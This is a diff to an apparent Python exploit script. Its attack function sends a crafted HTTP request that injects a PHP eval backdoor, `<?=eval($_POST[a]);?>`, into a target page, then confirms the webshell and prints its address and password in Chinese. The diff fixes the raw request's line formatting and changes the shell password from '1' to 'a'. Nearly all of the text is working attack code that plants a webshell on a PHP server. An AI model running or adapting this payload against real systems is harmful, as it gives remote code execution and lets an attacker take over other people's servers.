@@ -48,19 +48,18 @@ Upgrade-Insecure-Requests: 1
 
 
 def attack(url):
-    try:
-        payload1 = b'''
-        GET /index.php?m=--><?=eval($_POST[1]);?> HTTP/1.1
-        Host: localhost:8080
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-        Accept-Language: en-GB,en;q=0.5
-        Accept-Encoding: gzip, deflate
-        Connection: close
-        Cookie: PHPSESSID=b6r46ojgc9tvdqpg9efrao7f66;
-        Upgrade-Insecure-Requests: 1
+    payload1 = b'''GET /index.php?m=--><?=eval($_POST[a]);?> HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: PHPSESSID=b6r46ojgc9tvdqpg9efrao7f66;
+Upgrade-Insecure-Requests: 1
 
-            '''.replace(b'\n', b'\r\n')
+'''.replace(b'\n', b'\r\n')
+    try:
         oH = urlparse(url)
         a = oH.netloc.split(':')
         port = 80
@@ -79,7 +78,7 @@ def attack(url):
         if req2.status_code == 200:
             print('[*] webshell上传成功!')
             print('[*] Webshell地址: {0}'.format(payload2))
-            print('[*] 密码: 1')
+            print('[*] 密码: a')
             print('[+] have a good day!')
             return True
         else:
@@ -87,4 +86,3 @@ def attack(url):
             return False
     except:
         return False
-
